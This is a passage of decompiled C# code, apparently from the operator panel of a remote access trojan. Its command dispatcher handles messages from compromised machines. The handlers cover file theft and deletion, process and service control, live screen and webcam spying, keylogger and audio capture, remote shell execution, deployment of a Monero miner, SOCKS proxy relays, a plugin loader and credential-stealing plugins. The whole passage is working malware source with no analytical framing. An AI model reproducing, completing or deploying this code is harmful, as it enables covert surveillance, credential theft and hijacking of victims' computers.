																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "cli_rs", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "cli_off", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "con", true) == 0)
															{
																int num151 = class6.class152_0.string_0.Length;
																if (num151 != 15)
																{
																	if (num151 == 16)
																	{
																		fMain ff19 = cclient207.ff;
																		cclient208 = cclient207;
																		ff19.method_20(ref cclient208, ref class6.class152_0.string_0[0], ref class6.class152_0.string_0[1], ref class6.class152_0.string_0[2], ref class6.class152_0.string_0[3], ref class6.class152_0.string_0[4], ref class6.class152_0.string_0[5], ref class6.class152_0.string_0[6], ref class6.class152_0.string_0[7], ref class6.class152_0.string_0[8], ref class6.class152_0.string_0[9], ref class6.class152_0.string_0[10], ref class6.class152_0.string_0[11], ref class6.class152_0.string_0[12], ref class6.class152_0.string_0[13], ref class6.class152_0.string_0[14], ref class6.class152_0.string_0[15]);
																	}
																}
																else
																{
																	fMain ff20 = cclient207.ff;
																	cclient208 = cclient207;
																	string[] string_74 = class6.class152_0.string_0;
																	int num152 = 0;
																	string[] string_75 = class6.class152_0.string_0;
																	int num153 = 1;
																	string[] string_76 = class6.class152_0.string_0;
																	int num154 = 2;
																	string[] string_77 = class6.class152_0.string_0;
																	int num155 = 3;
																	string[] string_78 = class6.class152_0.string_0;
																	int num156 = 4;
																	string[] string_79 = class6.class152_0.string_0;
																	int num157 = 5;
																	string[] string_80 = class6.class152_0.string_0;
																	int num158 = 6;
																	string[] string_81 = class6.class152_0.string_0;
																	int num159 = 7;
																	string[] string_82 = class6.class152_0.string_0;
																	int num160 = 8;
																	string[] string_83 = class6.class152_0.string_0;
																	int num161 = 9;
																	string[] string_84 = class6.class152_0.string_0;
																	int num162 = 10;
																	string[] string_85 = class6.class152_0.string_0;
																	int num163 = 11;
																	string[] string_86 = class6.class152_0.string_0;
																	int num164 = 12;
																	string[] string_87 = class6.class152_0.string_0;
																	int num165 = 13;
																	string[] string_88 = class6.class152_0.string_0;
																	int num166 = 14;
																	string text22 = "Default";
																	ff20.method_20(ref cclient208, ref string_74[num152], ref string_75[num153], ref string_76[num154], ref string_77[num155], ref string_78[num156], ref string_79[num157], ref string_80[num158], ref string_81[num159], ref string_82[num160], ref string_83[num161], ref string_84[num162], ref string_85[num163], ref string_86[num164], ref string_87[num165], ref string_88[num166], ref text22);
																}
															}
															else if (Operators.CompareString(left3, "info", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient209 = cclient207;
																	bool flag7 = true;
																	cclient209.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__0)).Start();
															}
															else if (Operators.CompareString(left3, "drives_get", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient210 = cclient207;
																	bool flag7 = true;
																	cclient210.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__1)).Start();
															}
															else if (Operators.CompareString(left3, "files_get", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient211 = cclient207;
																	bool flag7 = true;
																	cclient211.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__2)).Start();
															}
															else if (Operators.CompareString(left3, "files_search", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient212 = cclient207;
																	bool flag7 = true;
																	cclient212.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_3(class6.class152_0.string_0[0], class6.class152_0.string_0[1], class6.class152_0.string_0[2], class6.class152_0.string_0[3], class6.class152_0.string_0[4], class6.class152_0.string_0[5], string.Empty, string.Empty);
															}
															else if (Operators.CompareString(left3, "files_search_error_start", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient213 = cclient207;
																	bool flag7 = true;
																	cclient213.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_2(class6.class152_0.string_0[0]);
															}
															else if (Operators.CompareString(left3, "files_search_error_file", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient214 = cclient207;
																	bool flag7 = true;
																	cclient214.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_3(class6.class152_0.string_0[0], class6.class152_0.string_0[1], class6.class152_0.string_0[2], "N/A", class6.class152_0.string_0[3], "N/A", string.Empty, class6.class152_0.string_0[4]);
															}
															else if (Operators.CompareString(left3, "files_search_path", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient215 = cclient207;
																	bool flag7 = true;
																	cclient215.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_8(class6.class152_0.string_0[0]);
																cclient207.fSrch.method_1(class6.class152_0.string_0[1]);
															}
															else if (Operators.CompareString(left3, "files_search_done", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient216 = cclient207;
																	bool flag7 = true;
																	cclient216.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_5(true, class6.class152_0.string_0[0]);
															}
															else if (Operators.CompareString(left3, "files_zip_start", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient217 = cclient207;
																	bool flag7 = true;
																	cclient217.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__3)).Start();
															}
															else if (Operators.CompareString(left3, "files_zip", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient218 = cclient207;
																	bool flag7 = true;
																	cclient218.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__4)).Start();
															}
															else if (Operators.CompareString(left3, "files_zip_end", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient219 = cclient207;
																	bool flag7 = true;
																	cclient219.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__5)).Start();
															}
															else if (Operators.CompareString(left3, "files_delete_start", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient220 = cclient207;
																	bool flag7 = true;
																	cclient220.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																fDashboard fDB21 = cclient207.fDB;
																value4 = (long)Math.Round(Conversion.Val(class6.class152_0.string_0[0]));
																string text22 = "0";
																fDB21.method_4(ref value4, ref text22);
															}
															else if (Operators.CompareString(left3, "files_delete", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient221 = cclient207;
																	bool flag7 = true;
																	cclient221.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																fDashboard fDB22 = cclient207.fDB;
																value4 = (long)Math.Round(Conversion.Val(class6.class152_0.string_0[0]));
																fDB22.method_4(ref value4, ref class6.class152_0.string_0[1]);
															}
															else if (Operators.CompareString(left3, "files_delete_end", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient222 = cclient207;
																	bool flag7 = true;
																	cclient222.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																fDashboard fDB23 = cclient207.fDB;
																value4 = (long)Math.Round(Conversion.Val(class6.class152_0.string_0[0]));
																fDB23.method_4(ref value4, ref class6.class152_0.string_0[1]);
															}
															else
															{
																if (Operators.CompareString(left3, "files_download", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient223 = cclient207;
																		bool flag7 = true;
																		cclient223.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	string text23 = string.Concat(new string[]
																	{
																		Application.StartupPath,
																		"\\Downloads\\",
																		Strings.Replace(cclient207.sUser, "\\", "^", 1, -1, CompareMethod.Text),
																		"\\",
																		Strings.Replace(class6.class152_0.string_0[0], ":", string.Empty, 1, -1, CompareMethod.Text)
																	});
																	byte[] array17 = Convert.FromBase64String(class6.class152_0.string_0[1]);
																	bool flag2 = true;
																	byte[] byte_ = array17;
																	string string_16 = text23;
																	Class136.Class142 class3 = new Class136.Class142();
																	class3.string_0 = string_16;
																	class3.byte_0 = byte_;
																	class3.bool_0 = false;
																	try
																	{
																		if (flag2)
																		{
																			new Thread(new ThreadStart(class3._Lambda$__0)).Start();
																		}
																		else
																		{
																			Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
																		}
																		goto IL_DDCE;
																	}
																	catch (Exception ex88)
																	{
																		goto IL_DDCE;
																	}
																}
																if (Operators.CompareString(left3, "prc_list", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient224 = cclient207;
																		bool flag7 = true;
																		cclient224.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	new Thread(new ThreadStart(class6.class152_0._Lambda$__6)).Start();
																}
																else if (Operators.CompareString(left3, "prc_kill", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient225 = cclient207;
																		bool flag7 = true;
																		cclient225.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__7)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "srv_list", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient226 = cclient207;
																		bool flag7 = true;
																		cclient226.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	new Thread(new ThreadStart(class6.class152_0._Lambda$__8)).Start();
																}
																else if (Operators.CompareString(left3, "srv_start", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient227 = cclient207;
																		bool flag7 = true;
																		cclient227.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__9)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "srv_control", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient228 = cclient207;
																		bool flag7 = true;
																		cclient228.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__10)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "srv_uninstall", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient229 = cclient207;
																		bool flag7 = true;
																		cclient229.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__11)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "wnd_list", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient230 = cclient207;
																		bool flag7 = true;
																		cclient230.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	new Thread(new ThreadStart(class6.class152_0._Lambda$__12)).Start();
																}
																else if (Operators.CompareString(left3, "wnd_cmd", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient231 = cclient207;
																		bool flag7 = true;
																		cclient231.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__13)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "wnd_title", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient232 = cclient207;
																		bool flag7 = true;
																		cclient232.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__14)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "screenlive", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient233 = cclient207;
																		bool flag7 = true;
																		cclient233.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (num150 - 1L == unchecked((long)array15[3].Length))
																	{
																		MemoryStream stream6 = new MemoryStream(class6.byte_0);
																		cclient207.fDB.vmethod_24().Image = Image.FromStream(stream6);
																		cclient207.SCREEN_FPS_UPDATE((double)(Strings.Len(array15[0]) + Strings.Len(array15[1]) + Strings.Len(array15[2]) + Strings.Len(array15[3]) + 4));
																	}
																}
																else if (Operators.CompareString(left3, "screenlive_secondary", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient234 = cclient207;
																		bool flag7 = true;
																		cclient234.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (num150 - 1L == unchecked((long)array15[3].Length))
																	{
																		MemoryStream stream7 = new MemoryStream(class6.byte_0);
																		cclient207.fDB.vmethod_248().Image = Image.FromStream(stream7);
																	}
																}
																else if (Operators.CompareString(left3, "screenlive_stop", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient235 = cclient207;
																		bool flag7 = true;
																		cclient235.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	cclient207.fDB.method_6();
																}
																else if (Operators.CompareString(left3, "screen_preview_stop", true) != 0)
																{
																	if (Operators.CompareString(left3, "monitors_refresh", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient236 = cclient207;
																			bool flag7 = true;
																			cclient236.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_7(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "webcamlive", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient237 = cclient207;
																			bool flag7 = true;
																			cclient237.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		if (num150 - 1L == unchecked((long)array15[3].Length))
																		{
																			MemoryStream stream8 = new MemoryStream(class6.byte_0);
																			cclient207.fDB.vmethod_264().Image = Image.FromStream(stream8);
																			CClient cclient238 = cclient207;
																			double num167 = (double)(Strings.Len(array15[0]) + Strings.Len(array15[1]) + Strings.Len(array15[2]) + Strings.Len(array15[3]) + 4);
																			cclient238.WEBCAM_FPS_UPDATE(ref num167);
																		}
																	}
																	else if (Operators.CompareString(left3, "webcam_start", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient239 = cclient207;
																			flag7 = true;
																			cclient239.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB24 = cclient207.fDB;
																		flag7 = true;
																		fDB24.method_9(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "webcam_stop", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient240 = cclient207;
																			flag7 = true;
																			cclient240.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB25 = cclient207.fDB;
																		flag7 = false;
																		fDB25.method_9(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "webcam_devices", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient241 = cclient207;
																			bool flag7 = true;
																			cclient241.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_8(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "klgoff_list", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient242 = cclient207;
																			bool flag7 = true;
																			cclient242.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_87(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "klgoff_get", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient243 = cclient207;
																			bool flag7 = true;
																			cclient243.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_88(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "klgoff_del", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient244 = cclient207;
																			bool flag7 = true;
																			cclient244.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_95(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "klgonlinestart", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient245 = cclient207;
																			flag7 = true;
																			cclient245.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB26 = cclient207.fDB;
																		flag7 = true;
																		fDB26.method_101(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "klgonlinestop", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient246 = cclient207;
																			flag7 = true;
																			cclient246.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB27 = cclient207.fDB;
																		flag7 = false;
																		fDB27.method_101(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "klgonlinedata", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient247 = cclient207;
																			bool flag7 = true;
																			cclient247.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_100(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "aud_rec", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient248 = cclient207;
																			bool flag7 = true;
																			cclient248.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		new Thread(new ThreadStart(class6._Lambda$__15)).Start();
																	}
																	else if (Operators.CompareString(left3, "aud_rec_list", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient249 = cclient207;
																			bool flag7 = true;
																			cclient249.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB28 = cclient207.fDB;
																		string text22 = Encoding.UTF8.GetString(Convert.FromBase64String(class6.class152_0.string_0[0]));
																		fDB28.method_96(ref text22);
																	}
																	else if (Operators.CompareString(left3, "shell_start", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient250 = cclient207;
																			flag7 = true;
																			cclient250.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB29 = cclient207.fDB;
																		flag7 = true;
																		fDB29.method_120(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "shell_stop", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient251 = cclient207;
																			flag7 = true;
																			cclient251.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB30 = cclient207.fDB;
																		flag7 = false;
																		fDB30.method_120(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "shell_exec", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient252 = cclient207;
																			bool flag7 = true;
																			cclient252.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_121(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "con_list", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient253 = cclient207;
																			bool flag7 = true;
																			cclient253.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__16)).Start();
																	}
																	else if (Operators.CompareString(left3, "xmr_mine_start", true) == 0)
																	{
																		Class130.fMinerXMR_0.method_0(cclient207.sKey, cclient207.sUser);
																	}
																	else if (Operators.CompareString(left3, "xmr_mine_stop", true) == 0)
																	{
																		Class130.fMinerXMR_0.method_2(cclient207.sKey);
																	}
																	else
																	{
																		if (Operators.CompareString(left3, "xmr_mine_req", true) == 0)
																		{
																			if (Operators.CompareString(class6.class152_0.string_0[0], "0", true) != 0)
																			{
																				goto IL_DDCE;
																			}
																			string sKey15 = cclient207.sKey;
																			string str47 = "xmr_mine_data|";
																			string text22 = Application.StartupPath + "\\data\\plugins\\xmr.plg";
																			string str48 = Class136.smethod_29(ref text22);
																			string str49 = "|";
																			text22 = Application.StartupPath + "\\data\\plugins\\xmr.plg";
																			string string_17 = str47 + str48 + str49 + Class136.smethod_13(ref text22);
																			string string_18 = sKey15;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_DDCE;
																			}
																			catch (Exception ex89)
																			{
																				goto IL_DDCE;
																			}
																		}
																		if (Operators.CompareString(left3, "xmr_mine_ready", true) == 0)
																		{
																			string sKey16 = cclient207.sKey;
																			string string_17 = "xmr_mine_start|" + cclient207.MINER_LAST_SETTINGS;
																			string string_18 = sKey16;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_DDCE;
																			}
																			catch (Exception ex90)
																			{
																				goto IL_DDCE;
																			}
																		}
																		if (Operators.CompareString(left3, "xmr64_mine_req", true) == 0)
																		{
																			if (Operators.CompareString(class6.class152_0.string_0[0], "0", true) != 0)
																			{
																				goto IL_DDCE;
																			}
																			string sKey17 = cclient207.sKey;
																			string str50 = "xmr64_mine_data|";
																			string text22 = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
																			string str51 = Class136.smethod_29(ref text22);
																			string str52 = "|";
																			text22 = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
																			string string_17 = str50 + str51 + str52 + Class136.smethod_13(ref text22);
																			string string_18 = sKey17;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_DDCE;
																			}
																			catch (Exception ex91)
																			{
																				goto IL_DDCE;
																			}
																		}
																		if (Operators.CompareString(left3, "xmr64_mine_ready", true) == 0)
																		{
																			string sKey18 = cclient207.sKey;
																			string string_17 = "xmr64_mine_start|" + cclient207.MINER_LAST_SETTINGS;
																			string string_18 = sKey18;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_DDCE;
																			}
																			catch (Exception ex92)
																			{
																				goto IL_DDCE;
																			}
																		}
																		if (Operators.CompareString(left3, "xmr_mine_stats", true) == 0)
																		{
																			if (Class130.fMinerXMR_0.Visible)
																			{
																				Class130.fMinerXMR_0.method_1(cclient207.sKey, class6.class152_0.string_0);
																			}
																		}
																		else if (Operators.CompareString(left3, "xmr_mine_log", true) == 0)
																		{
																			Class130.fMinerXMRLogManager_0.method_0(cclient207.sKey, cclient207.sIP + "^" + cclient207.sUser, class6.class152_0.string_0[0]);
																		}
																		else if (Operators.CompareString(left3, "socks4r_start", true) == 0)
																		{
																			Class130.fSocks4R_0.method_0(cclient207.sKey, cclient207.sUser, class6.class152_0.string_0[0], class6.class152_0.string_0[1]);
																		}
																		else if (Operators.CompareString(left3, "socks4r_stop", true) == 0)
																		{
																			Class130.fSocks4R_0.method_1(cclient207.sKey);
																		}
																		else if (Operators.CompareString(left3, "socks4r_stats", true) == 0)
																		{
																			Class130.fSocks4R_0.method_2(cclient207.sKey, class6.class152_0.string_0);
																		}
																		else if (Operators.CompareString(left3, "socks5_srv_start", true) == 0)
																		{
																			Class130.fSocks5_0.method_1(cclient207.sKey, cclient207.sUser, class6.class152_0.string_0[0], class6.class152_0.string_0[1]);
																		}
																		else if (Operators.CompareString(left3, "socks5_srv_stop", true) == 0)
																		{
																			Class130.fSocks5_0.method_2(cclient207.sKey);
																		}
																		else if (Operators.CompareString(left3, "socks5_srv_stats", true) == 0)
																		{
																			Class130.fSocks5_0.method_3(cclient207.sKey, class6.class152_0.string_0);
																		}
																		else
																		{
																			if (Operators.CompareString(left3, "plg_loader", true) == 0)
																			{
																				string sKey19 = cclient207.sKey;
																				string[] array18 = new string[6];
																				array18[0] = "plg_loader_data|";
																				array18[1] = class6.class152_0.string_0[0];
																				array18[2] = "|";
																				int num168 = 3;
																				string text22 = Application.StartupPath + "\\data\\plugins\\loader.plg";
																				array18[num168] = Class136.smethod_29(ref text22);
																				array18[4] = "|";
																				int num169 = 5;
																				text22 = Application.StartupPath + "\\data\\plugins\\loader.plg";
																				array18[num169] = Class136.smethod_13(ref text22);
																				string string_17 = string.Concat(array18);
																				string string_18 = sKey19;
																				Class136.Class138 class4 = new Class136.Class138();
																				class4.string_0 = string_18;
																				class4.string_1 = string_17;
																				class4.long_0 = 0L;
																				try
																				{
																					if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																					{
																						new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																					}
																					goto IL_DDCE;
																				}
																				catch (Exception ex93)
																				{
																					goto IL_DDCE;
																				}
																			}
																			if (Operators.CompareString(left3, "crd_logins_req", true) == 0)
																			{
																				if (Operators.CompareString(class6.class152_0.string_0[0], "0", true) != 0)
																				{
																					goto IL_DDCE;
																				}
																				string sKey20 = cclient207.sKey;
																				string str53 = "crd_logins_data|";
																				string text22 = Application.StartupPath + "\\data\\plugins\\pws.plg";
																				string str54 = Class136.smethod_29(ref text22);
																				string str55 = "|";
																				text22 = Application.StartupPath + "\\data\\plugins\\pws.plg";
																				string string_17 = str53 + str54 + str55 + Class136.smethod_13(ref text22);
																				string string_18 = sKey20;
																				Class136.Class138 class4 = new Class136.Class138();
																				class4.string_0 = string_18;
																				class4.string_1 = string_17;
																				class4.long_0 = 0L;
																				try
																				{
																					if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																					{
																						new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																					}
																					goto IL_DDCE;
																				}
																				catch (Exception ex94)
																				{
																					goto IL_DDCE;
																				}
																			}
																			if (Operators.CompareString(left3, "crd_logins", true) == 0)
																			{
																				if (cclient207.fDB == null)
																				{
																					CClient cclient254 = cclient207;
																					bool flag7 = true;
																					cclient254.SOCKET_DISCONNECT(ref flag7);
																					goto IL_DE40;
																				}
																				cclient207.fDB.method_2(ref class6.class152_0.string_0[0]);
																			}
																			else
																			{
																				if (Operators.CompareString(left3, "crd_logins_report_req", true) == 0)
																				{
																					if (Operators.CompareString(class6.class152_0.string_0[0], "0", true) != 0)
																					{
																						goto IL_DDCE;
																					}
																					string sKey21 = cclient207.sKey;
																					string str56 = "crd_logins_report_data|";
																					string text22 = Application.StartupPath + "\\data\\plugins\\pws.plg";
																					string str57 = Class136.smethod_29(ref text22);
																					string str58 = "|";
																					text22 = Application.StartupPath + "\\data\\plugins\\pws.plg";
																					string string_17 = str56 + str57 + str58 + Class136.smethod_13(ref text22);
																					string string_18 = sKey21;
																					Class136.Class138 class4 = new Class136.Class138();
																					class4.string_0 = string_18;
																					class4.string_1 = string_17;
																					class4.long_0 = 0L;
																					try
																					{
																						if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																						{
																							new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																						}
																						goto IL_DDCE;
																					}
																					catch (Exception ex95)
																					{
																						goto IL_DDCE;
																					}
																				}
																				if (Operators.CompareString(left3, "crd_logins_report", true) == 0)
																				{
																					Class130.fCredentialsLogins_0.method_3(cclient207.sKey, cclient207.sIP + "^" + cclient207.sUser, class6.class152_0.string_0[0]);
																				}
																				else if (Operators.CompareString(left3, "remotebrowser_info", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient255 = cclient207;
																						bool flag7 = true;
																						cclient255.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					cclient207.fDB.method_98(ref class6.class152_0.string_0[0]);
																				}
																				else if (Operators.CompareString(left3, "remotebrowser_error", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient256 = cclient207;
																						bool flag7 = true;
																						cclient256.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					cclient207.fDB.method_99(ref class6.class152_0.string_0[0]);
																				}
																				else if (Operators.CompareString(left3, "remotebrowser_stop", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
